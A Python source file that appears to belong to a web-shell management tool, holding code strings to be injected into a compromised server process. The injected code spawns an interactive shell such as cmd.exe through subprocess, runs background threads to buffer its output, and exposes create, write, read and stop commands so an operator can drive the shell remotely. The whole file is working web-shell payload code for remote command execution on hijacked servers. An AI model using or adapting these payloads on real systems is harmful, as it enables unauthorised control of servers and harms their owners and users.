# -*- coding: utf-8 -*-
"""
@Time ： 2024-06-15 4:42
@Auth ： No2Cat
@File ：RealCMDPayloads.py
@IDE ：PyCharm
@DESC：
"""
# 计时器 idle * 0.8 = 100000 * 0.8 = 80000 ms = 22H

injectMainFunc = """
import threading, queue, subprocess, locale, time, json
default_coding = locale.getdefaultlocale()
cmd_content = dict()
def X_read_output(terminal, outq):
    while cmd_content.get('run'):
        try:
            # std_output = terminal.stdout.read(10240)  # 读取 1024 字节的数据
            # outq.put(std_output.decode(locale.getpreferredencoding(), errors='replace'))
            for stdout_line in iter(terminal.stdout.readline, ""):
                outq.put(stdout_line.decode(locale.getpreferredencoding(), errors='replace'))
            # 
            # line = terminal.stdout.readline()
            # if line:
            #     outq.put(line.decode(locale.getpreferredencoding(), errors='replace'))
                # outq.put(line)
        except Exception as ex:
            print("X_read_output wrong" + str(ex))
            pass
def X_read_error(terminal, outq):
    while cmd_content.get('run'):
        try:
            for error_line in iter(terminal.stderr.readline, ""):
                outq.put(error_line.decode(locale.getpreferredencoding(), errors='replace'))
            #
            # errput = terminal.stderr.readline()
            # if errput:
            #     outq.put(errput.decode(locale.getpreferredencoding(), errors='replace'))
                # outq.put(errput)
        except:
            print("X_read_error wrong")
            pass
def X_output_reader(terminal, outq):
    idle = 0
    # while cmd_content.get('run') and idle < 100000:
    while cmd_content.get('run'):
        write = cmd_content.get('writeBuffer') if 'writeBuffer' in cmd_content else ''
        if len(write) > 0:
            terminal.stdin.write(write.encode(default_coding[-1]))
            # terminal.stdin.write(write)
            terminal.stdin.flush()
            cmd_content['writeBuffer'] = ''
            idle = 0
        else:
            idle += 1
        try:
            while not outq.empty():
                cmd_content['readBuffer'] += outq.get(block=False)
        except queue.Empty:
            pass
        # time.sleep(0.8)
    terminal.terminate()
def create_terminal(binPath):
    cmd_content['readBuffer'] = ''
    outq = queue.Queue()
    terminal = subprocess.Popen(binPath.split(' '), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # terminal = subprocess.Popen(binPath, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True, bufsize=1)
    cmd_content['run'] = True
    cmd_content['task_id'] = terminal.pid
    threading.Thread(target=X_read_output, args=(terminal, outq)).start()
    threading.Thread(target=X_read_error, args=(terminal, outq)).start()
    threading.Thread(target=X_output_reader, args=(terminal, outq)).start()
def X_main(data):
    type = data.get('type')
    binPath = data.get('binPath', "")
    cmd = data.get('cmd', "")
    result = dict()
    if type == 'create':
        create_terminal(binPath)
        result["status"] = "success"
        result["msg"] = "ok"
        result['task_id']  = cmd_content['task_id']
    elif type == 'read':
        if 'readBuffer' in cmd_content:
            readContent = cmd_content.get('readBuffer')
            cmd_content['readBuffer'] = ''
            result["status"] = "success"
            result["msg"] = readContent
        else:
            result["status"] = "fail"
            result["msg"] = "Virtual Terminal fail to start or timeout"
    elif type == 'write':
        cmd_content['writeBuffer'] = cmd + '\\n\\n'
        result["status"] = "success"
        result["msg"] = "ok"
    elif type == 'stop':
        cmd_content['run'] = False
        result["status"] = "stopped"
        result["msg"] = "ok"
    return json.dumps(result)
gl['X_main'] = X_main
resp = json.dumps({'status': 'success'}) 
"""


# {'type': 'create', 'binPath': 'cmd.exe', "cmd": "whoami"}
createTerminal = """
resp = gl['X_main']({'type': 'create', 'binPath': '$binPath$'})
"""

writeCommand = """
resp = gl['X_main']({'type': 'write', 'cmd': '$command$'})
"""

readTerminal = """
resp = gl['X_main']({'type': 'read'})
"""

stopTerminal = """
resp = gl['X_main']({'type': 'stop'})
"""

RealCMD = {
    'injectMainFunc': injectMainFunc,
    'createTerminal': createTerminal,
    'writeCommand': writeCommand,
    'readTerminal': readTerminal,
    'stopTerminal': stopTerminal,
}